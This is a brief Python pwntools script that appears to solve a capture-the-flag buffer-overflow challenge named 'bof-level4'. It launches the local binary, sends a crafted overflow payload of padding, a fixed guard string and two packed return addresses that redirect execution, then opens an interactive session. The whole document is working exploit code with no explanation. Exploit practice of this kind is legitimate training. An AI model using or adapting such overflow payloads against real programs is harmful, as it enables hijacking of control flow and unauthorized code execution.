#!/usr/bin/env python

from pwn import *;

p = process('./bof-level4');

output = p.recv();
print(output)

p.sendline('0' * 20 + 'ABCDEFGH' + '0' * 8 + p32(0x804876b) + '0' * 12 + p32(0x8048530));

p.interactive()
